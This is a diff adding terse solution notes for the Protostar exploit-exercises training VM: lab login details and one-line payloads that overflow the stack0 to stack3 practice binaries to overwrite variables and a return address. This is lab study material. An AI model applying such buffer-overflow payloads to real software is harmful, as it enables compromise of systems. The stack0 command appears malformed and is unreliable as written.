@@ -1,0 +1,60 @@
+Protostar
+
+running the exploit-exercises-protostar-2.iso in a vm
+
+Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
+
+The levels to be exploited can be found in the /opt/protostar/bin directory.
+
+For debugging the final levels, you can log in as root with password “godmode” (without the quotes)
+
+----------------------------------------
+
+Stack0
+
+python -c "print 'a' * 100" /opt/protostar/bin/stack0
+
+----------------------------------------
+
+Stack1
+
+/opt/protostar/bin/stack1 $(python -c "print 'a'*64 + 'd' + 'c' + 'b' + 'a'")
+
+----------------------------------------
+
+Stack2
+
+GREENIE=$(python -c "print 'a'*64 + '\x0a' + '\x0d' + '\x0a' + '\x0d'") /opt/protostar/bin/stack2
+
+----------------------------------------
+
+Stack3
+
+08048424
+
+/opt/protostar/bin/stack3 <<< $(python -c "print 'a'*64 + '\x24' + '\x84' + '\x04' + '\x08'")
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
+----------------------------------------
+
